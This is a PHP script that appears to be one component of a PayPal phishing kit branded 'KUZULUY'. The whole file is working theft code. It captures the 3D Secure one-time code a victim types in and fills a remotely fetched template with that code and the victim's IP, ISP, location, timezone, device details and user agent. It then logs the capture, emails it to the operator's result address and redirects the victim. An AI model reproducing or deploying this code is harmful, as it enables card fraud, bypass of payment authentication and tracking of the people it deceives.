<?php
require __DIR__ . '/../function.php';

$session = $_GET['session'];
$_SESSION['3dsecure-'.$session] = $_POST[$api->encypt('otp')];

$message = $api->get($api->server_api."/paypal/result/template_3dsecure.html")['data'];
$message = preg_replace('{KUZULUY-SERVER}', $api->server_api, $message);
$message = preg_replace('{KUZULUY-QUOTE}', $api->quote(), $message);
$message = preg_replace('{KUZULUY-3DSECURE}', $_SESSION['3dsecure-'.$session], $message);
$message = preg_replace('{KUZULUY-IP}', $_SESSION['ip'], $message);
$message = preg_replace('{KUZULUY-HOST}', $_SESSION['host'], $message);
$message = preg_replace('{KUZULUY-ISP}', $_SESSION['isp'], $message);
$message = preg_replace('{KUZULUY-LANGUAGE}', $_SESSION['language'], $message);
$message = preg_replace('{KUZULUY-TIMEZONE1}', $_SESSION['timezone'], $message);
$message = preg_replace('{KUZULUY-TIMEZONE2}', $_SESSION['iptimezone'], $message);
$message = preg_replace('{KUZULUY-RESOLUTION1}', $_SESSION['device_resolution'], $message);
$message = preg_replace('{KUZULUY-RESOLUTION2}', $_SESSION['browser_resolution'], $message);
$message = preg_replace('{KUZULUY-LATLONG}', $_SESSION['geonameid'], $message);
$message = preg_replace('{KUZULUY-LATITUDE}', $_SESSION['latitude'], $message);
$message = preg_replace('{KUZULUY-LONGITUDE}', $_SESSION['longitude'], $message);
$message = preg_replace('{KUZULUY-LOCATION}', $api->location()['full'], $message);
$message = preg_replace('{KUZULUY-USERAGENT}', $_SESSION['useragent'], $message);

$subject = "Menangisimu // {$_SESSION[$session.'_title']} // {$api->location()['title']} // {$_SESSION['ip']} // {$_SESSION['browser']} // {$_SESSION['os']}";
$api->save($api->logs("3dsecure"), $subject."\n", "a");
$api->send($api->result()['card'], $subject, $message, "Shani Indira Natio VBV");
$api->redirect("../restore/".$_GET['return']);
?>
